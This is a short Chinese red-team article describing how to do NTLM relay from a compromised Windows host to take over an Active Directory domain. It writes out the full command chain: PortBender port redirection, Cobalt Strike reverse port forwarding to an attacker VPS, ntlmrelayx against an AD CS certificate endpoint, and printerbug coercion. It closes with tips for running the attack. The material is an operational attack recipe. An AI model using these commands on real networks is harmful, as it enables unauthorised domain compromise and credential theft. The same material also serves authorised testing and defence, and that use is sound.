Author:腾讯蓝军 Jumbo

前言
==

在域内，有很多种手法可以获取域控权限，包括不限于利用溢出类的漏洞如ms17-010、抓取域管密码，当然也有今天的主角，利用ntlm relay。ntlm relay手法有很多，比如利用WPAD、LLMNR等“被动性”攻击，利用打印机等“主动性”攻击，核心就是中继了他人的net-ntlm。但是呢，利用工具监听的都是本地445端口，受害者机器与我们通信的也是445端口，而在windows上445端口是占用的，难道利用ntlm relay手法只能基于linux机器？

攻击过程
====

首先把受控机的445端口流量重定向到受控机自己的8445端口，然后把受控机的8445端口转发到黑客机器的445端口上，黑客机器利用受控机的socks代理攻击其他机器：

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-29fe6609e6bebdafd9f4b02b0e4190712332961e.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-29fe6609e6bebdafd9f4b02b0e4190712332961e.png)

以攻击AD CS为例：

环境如下：

192.168.8.144 主域

192.168.8.155 辅域

vpsip cobaltstrike机器

192.168.8.75 受控机

受控机**管理员权限**执行：

利用https://github.com/praetorian-inc/PortBender 把受控机的445端口重定向到受控机自己的8445端口，首先把驱动传到**当前shell目录下（pwd）**，根据自己系统位数传：

`upload xxxx.sys`

执行重定向：

`PortBender redirect 445 8445`

开启端口转发：

`rportfwd 8445  vpsip  445`

cs开启socks。

黑客机器执行：

设置代理。

开启relay：

`proxychains4 ntlmrelayx.py -t http://192.168.8.144/certsrv/certfnsh.asp -smb2support --adcs --template 'domain controller'`

利用socks或者exe触发强制回连，如打印机：

`python printerbug.py domain.com/user:pass@192.168.8.155 192.168.8.75`

成功获取证书信息：

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-8de02c459bc929ffa5585be98ae64c87528802ee.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-8de02c459bc929ffa5585be98ae64c87528802ee.png)

总结
==

这里最好spawn多个进程出来执行不同的命令，因为要做的实在太多了，有重定向、端口转发、socks，如果全在一个session里面执行可能会挂。其次因为走了很多层流量转发，因此黑客机器上收到流量时会特别慢。